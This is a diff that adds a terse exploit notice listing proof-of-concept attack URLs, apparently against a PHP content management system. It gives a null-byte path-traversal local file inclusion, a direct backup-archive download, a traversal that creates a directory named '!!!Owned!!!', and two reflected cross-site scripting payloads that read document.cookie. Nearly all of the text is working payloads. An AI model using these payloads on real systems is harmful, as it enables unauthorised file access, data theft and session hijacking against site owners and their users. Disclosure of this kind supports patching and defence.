@@ -1,0 +1,18 @@
+Local File Inclusion
+    Note : magic_quotes_gpc must be off.
+
+    http://www.example.com/index.php?page=weblog&amp;env=../../../autoexec.bat%00
+    
+Download Backup
+
+    http://www.example.com/backup/cmme_data.zip
+
+Make Directory
+
+    http://www.example.com/admin.php?action=login&amp;page=home&amp;script=index.php&amp;env=../!!!Owned!!!
+
+Cross Site Scripting  
+
+    http://www.example.com/statistics.php?action=hstat_year&amp;page=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;env=data
+
+    http://www.example.com/statistics.php?action=hstat_year&amp;year=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;env=data
